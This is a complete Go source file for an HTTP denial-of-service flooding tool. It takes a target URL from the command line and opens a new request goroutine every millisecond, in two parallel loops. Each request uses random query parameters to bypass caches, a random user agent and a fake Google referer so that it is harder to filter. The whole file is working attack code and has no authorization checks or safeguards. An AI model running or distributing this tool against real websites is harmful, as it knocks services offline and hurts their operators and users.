package main

import (
	"flag"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/buptmiao/parallel"
	"github.com/corpix/uarand"
	"github.com/gookit/color"
)

var (
	referers []string = []string{
		"https://www.google.com/?q=",
		"https://www.google.co.uk/?q=",
		"https://www.google.de/?q=",
		"https://www.google.ru/?q=",
		"https://www.google.tk/?q=",
		"https://www.google.cn/?q=",
		"https://www.google.cf/?q=",
		"https://www.google.nl/?q=",
	}
	fncCount     = NewCount()
	hostname     string
	param_joiner string
)

func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}

type Count struct {
	mx    *sync.Mutex
	count int
}

func NewCount() *Count {
	return &Count{mx: new(sync.Mutex), count: 0}
}

func (c *Count) Incr() {
	c.mx.Lock()
	c.count++
	c.mx.Unlock()
}

func (c *Count) Count() int {
	c.mx.Lock()
	count := c.count
	c.mx.Unlock()
	return count
}

func get() {
	if strings.ContainsRune(hostname, '?') {
		param_joiner = "&"
	} else {
		param_joiner = "?"
	}

	c := http.Client{
		Timeout: 3500 * time.Millisecond,
	}

	req, err := http.NewRequest("GET", hostname+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
	if err != nil {
		fmt.Println(err)
	}

	req.Header.Set("User-Agent", uarand.GetRandom())
	req.Header.Add("Pragma", "no-cache")                                            
	req.Header.Add("Cache-Control", "no-store, no-cache")                                    
	req.Header.Set("Referer", referers[rand.Intn(len(referers))]+buildblock(rand.Intn(5)+5))
	req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
	req.Header.Set("Connection", "keep-alive")

	resp, err := c.Do(req)

	fncCount.Incr()

	if os.IsTimeout(err) {
		color.Red.Println("Timeout")
	} else {
		color.Green.Println("Connect")
	}

	if err != nil {
		return
	}

	defer resp.Body.Close()
}

func loop() {
	for {
		go get()
		time.Sleep(1 * time.Millisecond) // sleep before sending request again
	}
}

func main() {
	flag.StringVar(&hostname, "url", "", "example: --url https://example.com")
	flag.Parse()

	if len(hostname) == 0 {
		color.Red.Println("Missing hostname.")
		color.Blue.Println("Example usage:\n\t ./main --url https://example.com")
		os.Exit(1)
	}

	color.Yellow.Println("Press control+c to stop")
	time.Sleep(2 * time.Second)

	start := time.Now()

	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		color.Blue.Println("\nAttempted to send", fncCount.Count(), "requests in", time.Since(start)) // print when control+c is pressed
		os.Exit(1)
	}()

	p := parallel.NewParallel() // runs function in parallel
	p.Register(loop)
	p.Register(loop)
	p.Run()
}
